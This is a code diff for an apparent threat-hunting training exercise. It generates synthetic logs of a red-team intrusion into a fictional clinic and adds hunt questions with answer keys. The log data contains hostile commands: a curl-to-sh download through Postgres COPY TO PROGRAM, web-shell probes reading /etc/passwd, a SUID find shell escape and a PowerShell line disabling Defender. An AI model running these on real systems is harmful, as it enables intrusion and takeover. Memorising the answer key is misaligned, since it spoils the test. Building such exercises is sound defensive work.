@@ -108,9 +108,92 @@ function buildCedarline(ctx) {
   return out;
 }
 
+// Per-finding red-team bursts: what the red team does to THIS weakness shows up in the logs as that activity.
+function findingWave(fid, att, P, host, bad, t, n) {
+  const out = [];
+  switch (fid) {
+    case 'firewall-anyany':
+      for (let k = 0; k < n; k++) out.push(fw(t, P.fw, att, ctx_wan(P), pr(k + 5), [3389, 445, 3306, 5432, 135, 5900, 23][k % 7], 'pass', 'in'));
+      return out;
+    case 'web-admin-default':
+      for (let k = 0; k < n; k++) out.push(web(t, host, att, 'POST', '/wp-login.php', bad && k >= n - 3 ? 302 : 200, bad && k >= n - 3 ? 0 : 4410, 'python-requests/2.31.0'));
+      if (bad) out.push(web(t, host, att, 'GET', '/wp-admin/plugin-install.php', 200, 61230, 'python-requests/2.31.0'));
+      return out;
+    case 'web-shell':
+      for (let k = 0; k < n; k++) out.push(web(t, host, att, 'GET', `/wp-content/uploads/2026/10/stats.php?cmd=${['id', 'whoami', 'uname+-a', 'crontab+-l', 'cat+/etc/passwd'][k % 5]}`, 200, 80 + k));
+      return out;
+    case 'mysql-exposed':
+      for (let k = 0; k < n; k++) out.push({ t, kind: 'db', sub: 'my_denied', host, fields: { src_ip: att, pid: pid(k), ms: '310', thread: String(3000 + k), user: 'root', dest_port: 3306, action: bad && k >= n - 3 ? 'success' : 'failure', app: 'mysqld', pw: 'YES' } });
+      return out;
+    case 'mail-open-relay':
+      for (let k = 0; k < n; k++) out.push({ t, kind: 'mail', sub: k % 3 === 2 ? 'sent' : 'connect', host, fields: { src_ip: att, pid: pid(k), lip: P.web ? '10.10.10.30' : '10.10.10.30', session: hx(k, 8) + '/' + hx(k + 9, 8), qid: hx(k + 3, 10).toUpperCase(), qid2: hx(k + 4, 5), from: `promo${k}@spam-sender.example`, rcpt: `victim${k}@gmail.example`, helo: 'kali', size: 31000 + k * 17, relay: 'mx.gmail.example', relay_ip: '192.0.2.44', delay: '0.42', action: 'success' } });
+      return out;
+    case 'ssh-root-key':
+      for (let k = 0; k < n; k++) {
+        if (bad && k >= n - 3) out.push(auth(t, host, k === n - 1 ? 'session_open' : 'accepted_key', 'root', att, { fp: 'k4Qn0Zr9mXbT2uLw7YhVd1sPcE8aJf3GoNi5RtB6yCg' }));
+        else out.push(auth(t, host, 'failed_user', 'root', att));
+      }
+      return out;
+    case 'rogue-da': case 'guest-admin':
+      for (let k = 0; k < n; k++) {
+        const who = fid === 'rogue-da' ? 'svc-backup2' : 'Guest';
+        const code = bad && k >= n - 3 ? [4624, 4672, 4728][k - (n - 3)] : 4625;
+        out.push(win(t, host, code, { user: who, Account_Name: who, Logon_Type: 3, src_ip: att, src_port: pr(k), Workstation_Name: 'KALI', Account_Domain: P.netbios, Target_Account_Name: who, Group_Name: fid === 'rogue-da' ? 'Domain Admins' : 'Account Operators' }));
+      }
+      return out;
+    case 'smbv1-dc': case 'print-spooler':
+      for (let k = 0; k < n; k++) out.push(fw(t, P.fw, att, `${P.lanPrefix || '10.10.10'}.10`, pr(k + 11), fid === 'smbv1-dc' ? 445 : 135, 'pass', 'in'));
+      if (bad) out.push(win(t, host, 4688, { user: 'SYSTEM', Account_Name: 'SYSTEM', New_Process_Name: fid === 'smbv1-dc' ? 'C:\\Windows\\System32\\cmd.exe' : 'C:\\Windows\\System32\\spoolsv.exe', Creator_Process_Name: 'C:\\Windows\\System32\\services.exe' }));
+      return out;
+    case 'ws-schtask': case 'ws-local-admin':
+      for (let k = 0; k < n; k++) out.push(win(t, host, bad && k >= n - 2 ? (fid === 'ws-schtask' ? 4698 : 4720) : 4625, { user: 'Administrator', Account_Name: 'Administrator', Logon_Type: 3, src_ip: att, src_port: pr(k), Workstation_Name: 'KALI', Account_Domain: P.netbios, Task_Name: 'SystemCheck', Target_Account_Name: 'support2' }));
+      return out;
+    case 'exposed-git':
+      for (let k = 0; k < n; k++) out.push(web(t, host, att, 'GET', ['/.git/HEAD', '/.git/config', '/.git/index', '/.git/objects/pack/', '/.env'][k % 5], bad ? 200 : 403, bad ? 211 + k * 9 : 199, 'git-dumper/1.0'));
+      return out;
+    case 'postgres-trust':
+      for (let k = 0; k < n; k++) out.push({ t, kind: 'db', sub: bad && k > 2 ? 'pg_dur' : 'pg_auth', host, fields: { src_ip: att, src_port: pr(k), pid: pid(k), ms: '211', user: 'postgres', database: 'members', dest_port: 5432, statement: bad ? `COPY members TO PROGRAM 'curl http://${att}/x|sh'` : 'SELECT version()', duration: '12.411', app: 'psql', action: 'success' } });
+      return out;
+    case 'app-cron': case 'web-shell2':
+      for (let k = 0; k < n; k++) out.push(cron(t + k, host, '/tmp/.sysupd.sh >/dev/null 2>&1'));
+      return out;
+    case 'smb-signing':
+      for (let k = 0; k < n; k++) out.push(fw(t, P.fw, att, `${P.lanPrefix || '10.10.10'}.10`, pr(k + 21), 445, 'pass', 'in'));
+      if (bad) {
+        out.push(win(t, host, 4624, { user: 'n.park', Account_Name: 'n.park', Logon_Type: 3, src_ip: att, src_port: pr(n), Workstation_Name: 'KALI', Account_Domain: P.netbios }));
+        out.push(win(t, host, 4672, { user: 'n.park', Account_Name: 'n.park', Logon_Type: 3 }));
+      }
+      return out;
+    case 'weak-pw-policy':
+      for (let k = 0; k < n; k++) {
+        const ok = bad && k >= n - 2;
+        const who = ['n.park', 'd.ibrahim', 'svc-ehr', 'Administrator', 'r.ellis'][k % 5];
+        out.push(win(t, host, ok ? 4624 : 4625, { user: who, Account_Name: who, Logon_Type: 3, src_ip: att, src_port: pr(k), Workstation_Name: 'KALI', Account_Domain: P.netbios }));
+      }
+      return out;
+    case 'ws-defender-off':
+      for (let k = 0; k < n; k++) out.push(win(t, host, 4688, { user: 'nurse', Account_Name: 'nurse', New_Process_Name: k % 2 ? 'C:\\ProgramData\\Updates\\updsvc.exe' : 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true', Creator_Process_Name: 'C:\\Windows\\explorer.exe' }));
+      return out;
+    case 'tls-legacy':
+      for (let k = 0; k < n; k++) out.push(web(t, host, att, 'GET', ['/login', '/api/v1/patients', '/session/refresh'][k % 3], bad ? 200 : 426, bad ? 2100 + k : 0, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) TLSv1.0'));
+      return out;
+    case 'suid-find':
+      for (let k = 0; k < n; k++) out.push(sudo(t, host, 'www-data', '/var/www/ehr', bad ? '/usr/bin/find . -exec /bin/sh -p ; -quit' : '/usr/bin/find / -perm -4000'));
+      return out;
+    case 'redis-open':
+      for (let k = 0; k < n; k++) out.push(fw(t, P.fw, att, `${P.lanPrefix || '10.10.10'}.40`, pr(k + 31), 6379, 'pass', 'in'));
+      if (bad) out.push(auth(t, host, 'accepted_key', 'redis', att, { fp: 'Zq8Lw3Pn7XcV1mHb5TyR0eKd9sGaJf2UoNi4BtC6vYg' }));
+      return out;
+    default: return null;
+  }
+}
+const ctx_wan = (P) => P.wanIp || '203.0.113.2';
+
 function waveLinesGeneric(att, P) {
-  return (ctx, host, outcome, at0, n) => {
+  return (ctx, host, outcome, at0, n, findingId) => {
     const out = [];
+    const spec = findingId ? findingWave(findingId, att, { ...P, wanIp: ctx.P.wanIp }, host, outcome === 'compromised', at0, n) : null;
+    if (spec) return spec;
     const bad = outcome === 'compromised';
     const t = at0;
     if (host === P.web) {
@@ -203,6 +286,61 @@ function buildHarbor(ctx) {
   return out;
 }
 
+// =====================================================================================================
+// Ridgeview Regional Medical Clinic: unauthenticated Redis -> planted SSH key -> pivot -> rogue Domain Admin
+// =====================================================================================================
+const ATT3 = '203.0.113.88';
+const C2_3 = '198.51.100.77';
+const RV_PROFILE = {
+  web: 'ehr01', db: 'db01', mail: null, dc: 'dc01', ws: 'ws01', fw: 'edge-fw',
+  linux: ['ehr01', 'ehr01', 'db01'], linuxUsers: ['ops', 'deploy', 'analyst'],
+  adUsers: ['n.park', 'd.ibrahim', 'r.ellis', 'm.castillo', 't.osei', 'l.brandt', 'a.nakamura', 'j.fontaine', 'k.vance', 'svc-ehr'],
+  privUsers: ['Administrator', 'svc-ehr'], winMachines: ['WS01', 'WS02', 'NURSE03', 'FRONTDESK1', 'DC01'],
+  lanHosts: ['ws01', 'ehr01', 'db01', 'dc01'], lanPrefix: '10.30.40', publicHost: 'ehr.ridgeview.example',
+  domain: 'ridgeview.local', netbios: 'RIDGEVIEW', dbKind: 'mysql', wp: false,
+};
+
+function buildRidgeview(ctx) {
+  const N = (base, min) => Math.max(min, Math.round(base * ctx.scale));
+  const EHR = 'ehr01'; const DB = 'db01'; const DC = 'dc01'; const WS = 'ws01'; const FW = 'edge-fw';
+  const out = [];
+  const wan = ctx.P.wanIp; const L = (id) => ctx.P.ip(id);
+  const PORTS = [22, 53, 80, 135, 139, 443, 445, 2575, 3306, 3389, 5985, 6379, 8080];
+  // 1. Recon through the any-any edge firewall
+  span(at('2026-10-29 01:52:10'), at('2026-10-29 01:55:40'), PORTS.length, (k, t) => out.push(fw(t, FW, ATT3, wan, pr(k + 2), PORTS[k], 'pass', 'in')));
+  // 2. Redis (6379) probed and driven from the internet: a burst of connections to db01
+  const nR = N(40, 14);
+  span(at('2026-10-29 02:18:05'), at('2026-10-29 02:24:30'), nR, (k, t) => out.push(fw(t, FW, ATT3, L(DB), pr(k + 60), 6379, 'pass', 'in')));
+  // 3. First login: an SSH key planted through CONFIG SET dir/dbfilename gives a shell as the redis user
+  const FP = 'Zq8Lw3Pn7XcV1mHb5TyR0eKd9sGaJf2UoNi4BtC6vYg';
+  out.push(auth(at('2026-10-29 02:36:19'), DB, 'accepted_key', 'redis', ATT3, { fp: FP }));
+  out.push(auth(at('2026-10-29 02:36:19'), DB, 'session_open', 'redis', ATT3));
+  for (const when of ['2026-10-29 09:14:50', '2026-10-30 03:22:41', '2026-10-30 22:08:09', '2026-10-31 05:57:30']) out.push(auth(at(when), DB, 'accepted_key', 'redis', ATT3, { fp: FP }));
+  // 4. Pivot to the EHR server and use the SUID find binary for root
+  out.push(auth(at('2026-10-29 02:51:03'), EHR, 'accepted_key', 'redis', L(DB), { fp: FP }));
+  out.push(sudo(at('2026-10-29 02:53:27'), EHR, 'redis', '/home/redis', '/usr/bin/find . -exec /bin/sh -p ; -quit'));
+  const w0 = at('2026-10-29 02:58:00');
+  ['/login', '/api/v1/patients?limit=500', '/api/v1/patients/export.csv'].forEach((u, k) => out.push(web(w0 + k * 40, EHR, ATT3, 'GET', u, 200, 2100 + k * 4200, 'curl/7.81.0')));
+  // 5. Pivot to the domain controller with a stolen admin credential; create svc-hl7 and make it Domain Admin
+  out.push(win(at('2026-10-29 03:20:12'), DC, 4624, { user: 'Administrator', Account_Name: 'Administrator', Logon_Type: 3, src_ip: L(EHR), src_port: 52114, Workstation_Name: 'EHR01', Account_Domain: 'RIDGEVIEW' }));
+  out.push(win(at('2026-10-29 03:20:12'), DC, 4672, { user: 'Administrator', Account_Name: 'Administrator', Logon_Type: 3 }));
+  out.push(win(at('2026-10-29 03:24:07'), DC, 4720, { Subject_Account_Name: 'Administrator', Subject_Account_Domain: 'RIDGEVIEW', Target_Account_Name: 'svc-hl7', user: 'svc-hl7' }));
+  out.push(win(at('2026-10-29 03:24:19'), DC, 4724, { Subject_Account_Name: 'Administrator', Subject_Account_Domain: 'RIDGEVIEW', Target_Account_Name: 'svc-hl7', user: 'svc-hl7' }));
+  out.push(win(at('2026-10-29 03:24:31'), DC, 4728, { Subject_Account_Name: 'Administrator', Subject_Account_Domain: 'RIDGEVIEW', Target_Account_Name: 'svc-hl7', user: 'svc-hl7', Group_Name: 'Domain Admins', Group_Rid: 512 }));
+  out.push(win(at('2026-10-29 03:26:02'), DC, 4624, { user: 'svc-hl7', Account_Name: 'svc-hl7', Logon_Type: 3, src_ip: L(EHR), src_port: 52380, Workstation_Name: 'EHR01', Account_Domain: 'RIDGEVIEW' }));
+  // decoy: a legitimate HR account creation on another morning
+  out.push(win(at('2026-10-30 08:45:10'), DC, 4720, { Subject_Account_Name: 'Administrator', Subject_Account_Domain: 'RIDGEVIEW', Target_Account_Name: 'f.ortega', user: 'f.ortega' }));
+  out.push(win(at('2026-10-30 08:45:44'), DC, 4728, { Subject_Account_Name: 'Administrator', Subject_Account_Domain: 'RIDGEVIEW', Target_Account_Name: 'f.ortega', user: 'f.ortega', Group_Name: 'Clinical Staff', Group_Rid: 1121 }));
+  // 6. Nurse-station PC: Defender turned off, then a binary dropped into the excluded folder
+  out.push(win(at('2026-10-29 03:40:51'), WS, 4624, { user: 'svc-hl7', Account_Name: 'svc-hl7', Logon_Type: 3, src_ip: L(DC), src_port: 49733, Workstation_Name: 'DC01', Account_Domain: 'RIDGEVIEW' }));
+  out.push(win(at('2026-10-29 03:41:15'), WS, 4688, { user: 'svc-hl7', Account_Name: 'svc-hl7', New_Process_Name: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true', Creator_Process_Name: 'C:\\Windows\\System32\\services.exe' }));
+  out.push(win(at('2026-10-29 03:42:02'), WS, 4688, { user: 'svc-hl7', Account_Name: 'svc-hl7', New_Process_Name: 'C:\\ProgramData\\Updates\\updsvc.exe', Creator_Process_Name: 'C:\\Windows\\System32\\services.exe' }));
+  // 7. C2 beacon: ws01 -> 198.51.100.77:9001 every five minutes, allowed outbound
+  const b0 = at('2026-10-29 03:46:00'); const nB = Math.floor((ctx.roundStart - b0) / 300);
+  span(b0, b0 + nB * 300, nB, (k, t) => out.push(fw(t, FW, L(WS), C2_3, pr(k + 500), 9001, 'pass', 'out')));
+  return out;
+}
+
 const DAY72 = 72 * 3600;
 const roundStart = at('2026-10-31 09:00:00');
 
@@ -231,6 +369,19 @@ export const STORIES = {
       { id: 'first_login_time', q: 'What time (hh:mm, EDT) was the first successful login?', accept: /\b03:41\b|\b3:41(:\d\d)?\s*am\b/i, explain: 'connection authorized for hp_app from 203.0.113.131 at 03:41:07 on Oct 29.' },
       { id: 'backdoor_account', q: 'Which local account was created on the teller workstation?', accept: /svc_update/i, explain: 'EventCode 4720 then 4732 (Administrators) on ws01. Note it is svc_update with an underscore.' },
       { id: 'c2', q: 'Where does the workstation beacon to (IP:port)?', accept: /198\.51\.100\.214\D{1,5}4443/, explain: 'Outbound passes every ten minutes from 10.20.30.55 to 198.51.100.214:4443.' },
+    ],
+  },
+  'ridgeview-lab-2026': {
+    id: 'ridgeview-lab-2026', spanSec: DAY72, roundStart, profile: RV_PROFILE, attacker: ATT3, c2: `${C2_3}:9001`,
+    build: buildRidgeview,
+    waveLines: waveLinesGeneric(ATT3, RV_PROFILE),
+    hunt: [
+      { id: 'attacker_ip', q: 'What is the external IP address the attacker used?', accept: /203\.0\.113\.88/, explain: 'It sweeps ports on the firewall, hammers 6379 on db01, then logs in over SSH and reaches the EHR server from there.' },
+      { id: 'vector', q: 'What was the initial access vector?', accept: /redis|6379|unauth\w* (cache|database|service)|exposed (cache|database)|open (cache|database)/i, explain: 'A burst of firewall passes from one address to db01 port 6379 (Redis), then an SSH login as a user that never logs in from outside: Redis CONFIG SET was used to write an SSH key.' },
+      { id: 'first_account', q: 'Which account did the attacker log in with first?', accept: /^\s*(the\s+)?redis(\s+(user|account|service account))?\s*$/i, explain: 'linux_secure on db01: "Accepted publickey for redis from 203.0.113.88". The redis service account should never accept an interactive login.' },
+      { id: 'first_login_time', q: 'What time (hh:mm, EDT, 24h or am/pm) was the first successful login?', accept: /\b02:36\b|\b2:36(:\d\d)?\s*am\b/i, explain: 'The Accepted publickey line for redis from the attacker IP is at 02:36:19 on Oct 29.' },
+      { id: 'backdoor_account', q: 'Which backdoor account was created in Active Directory?', accept: /svc-hl7/i, explain: 'EventCode 4720 on dc01, then 4728 adding it to Domain Admins. The same morning, f.ortega was a legitimate HR creation.' },
+      { id: 'c2', q: 'Where does the workstation beacon to (IP:port)?', accept: /198\.51\.100\.77\D{1,5}9001/, explain: 'Firewall pass lines every five minutes from 10.30.40.55 to 198.51.100.77:9001, starting minutes after Defender was disabled.' },
     ],
   },
 };
